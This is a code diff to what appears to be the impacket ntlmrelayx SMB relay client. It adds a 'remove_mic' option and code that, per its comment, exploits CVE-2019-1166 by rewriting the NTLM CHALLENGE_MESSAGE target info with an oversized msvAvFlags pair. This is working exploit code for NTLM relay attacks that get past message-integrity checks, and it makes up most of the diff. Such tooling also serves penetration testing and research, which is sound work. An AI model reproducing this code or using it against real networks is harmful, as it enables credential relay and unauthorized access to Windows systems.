@@ -31,8 +31,9 @@ from impacket import LOG
 from impacket.examples.ntlmrelayx.clients import ProtocolClient
 from impacket.examples.ntlmrelayx.servers.socksserver import KEEP_ALIVE_TIMER
 from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED, STATUS_LOGON_FAILURE
-from impacket.ntlm import NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_ALWAYS_SIGN, NTLMAuthChallenge, NTLMAuthChallengeResponse, \
-    generateEncryptedSessionKey, hmac_md5
+from impacket.ntlm import NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_ALWAYS_SIGN, NTLMAuthChallenge, \
+    NTLMAuthChallengeResponse, \
+    generateEncryptedSessionKey, hmac_md5, AV_PAIRS, NTLMSSP_AV_FLAGS
 from impacket.smb import SMB, NewSMBPacket, SMBCommand, SMBSessionSetupAndX_Extended_Parameters, \
     SMBSessionSetupAndX_Extended_Data, SMBSessionSetupAndX_Extended_Response_Data, \
     SMBSessionSetupAndX_Extended_Response_Parameters, SMBSessionSetupAndX_Data, SMBSessionSetupAndX_Parameters
@@ -329,6 +330,23 @@ class SMBRelayClient(ProtocolClient):
             challenge.fromString(self.sendNegotiatev2(negotiateMessage))
 
         self.negotiateMessage = negotiateMessage
+        if self.serverConfig.remove_mic:
+            # This section will exploit CVE-2019-1166 by injecting an 'msvAvFlag' into the CHALLENGE_MESSAGE with length 0x8
+            # instead of length 0x4. It is possible that in this case the authentication succeed but then you get an access denied when trying
+            # to access shares.
+            av_pairs = AV_PAIRS(challenge['TargetInfoFields'])
+
+            avFlagsPair = pack("<q", 0)
+            new_av_pairs = AV_PAIRS()
+            new_av_pairs[NTLMSSP_AV_FLAGS] = avFlagsPair
+
+            for key in av_pairs.fields.keys():
+                new_av_pairs[key] = av_pairs.fields.get(key)[1]
+
+            challenge['TargetInfoFields'] = new_av_pairs.getData()
+            challenge['TargetInfoFields_len'] = len(new_av_pairs.getData())
+            challenge['TargetInfoFields_max_len'] = len(new_av_pairs.getData())
+
         self.challengeMessage = challenge.getData()
 
         # Store the Challenge in our session data dict. It will be used by the SMB Proxy
